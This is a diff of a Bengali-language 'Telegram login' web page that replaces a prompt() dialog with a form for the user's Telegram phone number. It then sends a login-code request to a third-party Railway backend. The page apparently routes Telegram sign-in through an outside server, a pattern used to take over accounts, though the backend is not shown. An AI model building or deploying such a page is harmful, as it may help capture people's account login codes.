@@ -24,7 +24,7 @@
             border-radius: 24px;
             padding: 40px;
             width: 100%;
-            max-width: 400px;
+            max-width: 450px;
             text-align: center;
             box-shadow: 0 20px 60px rgba(0,0,0,0.3);
         }
@@ -101,14 +101,44 @@
             width: 100%;
             margin-top: 10px;
         }
+        .phone-section {
+            margin-bottom: 20px;
+            display: none;
+        }
+        .phone-section.show {
+            display: block;
+        }
+        .phone-input {
+            width: 100%;
+            padding: 14px;
+            margin: 10px 0;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 16px;
+        }
+        .save-btn {
+            background: #17a2b8;
+            color: white;
+            border: none;
+            padding: 12px;
+            border-radius: 12px;
+            cursor: pointer;
+            width: 100%;
+        }
         .message {
             margin-top: 20px;
             padding: 12px;
             border-radius: 12px;
             display: none;
         }
-        .success { background: #d4edda; color: #155724; }
-        .error { background: #f8d7da; color: #721c24; }
+        .success {
+            background: #d4edda;
+            color: #155724;
+        }
+        .error {
+            background: #f8d7da;
+            color: #721c24;
+        }
         .loading {
             display: none;
             margin-top: 20px;
@@ -136,9 +166,16 @@
 <body>
     <div class="container">
         <h1>🔐 টেলিগ্রাম লগইন</h1>
-        <div class="subtitle">কোনো ফোন নম্বর দিতে হবে না</div>
+        <div class="subtitle">আপনার টেলিগ্রাম অ্যাকাউন্টে লগইন করুন</div>
         
-        <!-- শুধু কনফার্ম বাটন -->
+        <!-- ফোন নাম্বার সেকশন (শুধু প্রথমবার) -->
+        <div id="phoneSection" class="phone-section">
+            <p>📱 আপনার টেলিগ্রামের ফোন নাম্বার দিন</p>
+            <input type="tel" id="phoneInput" class="phone-input" placeholder="+8801XXXXXXXXX">
+            <button class="save-btn" onclick="savePhone()">💾 সংরক্ষণ করুন</button>
+        </div>
+        
+        <!-- লগইন সেকশন -->
         <div id="loginSection">
             <button class="confirm-btn" id="confirmBtn" onclick="sendCode()">
                 📱 কনফার্ম করুন
@@ -164,25 +201,34 @@
     </div>
     
     <script>
-        // ===== Railway API URL (তোমার Railway URL দিয়ে Replace করো) =====
-        const API_URL = 'https://your-railway-app.up.railway.app';
-        // ==================================================================
+        // ==================== 🔧 এখানে তোমার রেলওয়ে URL বসাও ====================
+        const API_URL = 'tg-production-f058.up.railway.app';
+        // ========================================================================
         
-        // ফোন নাম্বার লোকাল স্টোরেজ থেকে নাও (প্রথমবার সেট করা থাকলে)
         let userPhone = localStorage.getItem('user_phone');
         
-        // পেজ লোড হলে চেক করো ফোন নাম্বার আছে কিনা
         window.onload = function() {
             if (!userPhone) {
-                // ফোন নাম্বার না থাকলে জিজ্ঞাসা করো (শুধু প্রথমবার)
-                userPhone = prompt('আপনার টেলিগ্রামের ফোন নাম্বার দিন (আন্তর্জাতিক ফরম্যাটে):\n+8801XXXXXXXXX');
-                if (userPhone && userPhone.startsWith('+')) {
-                    localStorage.setItem('user_phone', userPhone);
-                } else {
-                    alert('সঠিক ফোন নাম্বার দিন! পেজ রিফ্রেশ করুন।');
-                }
+                document.getElementById('phoneSection').classList.add('show');
+                document.getElementById('loginSection').style.display = 'none';
+            } else {
+                document.getElementById('phoneSection').classList.remove('show');
+                document.getElementById('loginSection').style.display = 'block';
             }
         };
+        
+        function savePhone() {
+            const phone = document.getElementById('phoneInput').value.trim();
+            if (!phone || !phone.startsWith('+')) {
+                showMessage('সঠিক ফোন নাম্বার দিন (+8801XXXXXXXXX)', 'error');
+                return;
+            }
+            userPhone = phone;
+            localStorage.setItem('user_phone', phone);
+            document.getElementById('phoneSection').classList.remove('show');
+            document.getElementById('loginSection').style.display = 'block';
+            showMessage('ফোন নাম্বার সংরক্ষিত হয়েছে!', 'success');
+        }
         
         function showMessage(msg, type) {
             const msgDiv = document.getElementById('message');
@@ -200,7 +246,7 @@
         
         async function sendCode() {
             if (!userPhone) {
-                showMessage('ফোন নাম্বার সেট করা নেই! পেজ রিফ্রেশ করুন।', 'error');
+                showMessage('ফোন নাম্বার সেট করা নেই!', 'error');
                 return;
             }
             
@@ -228,7 +274,7 @@
                 }
             } catch (error) {
                 showLoading(false);
-                showMessage('সার্ভার সংযোগ ত্রুটি!', 'error');
+                showMessage('সার্ভার সংযোগ ত্রুটি! ব্যাকএন্ড চালু আছে কিনা চেক করুন।', 'error');
                 btn.disabled = false;
             }
         }
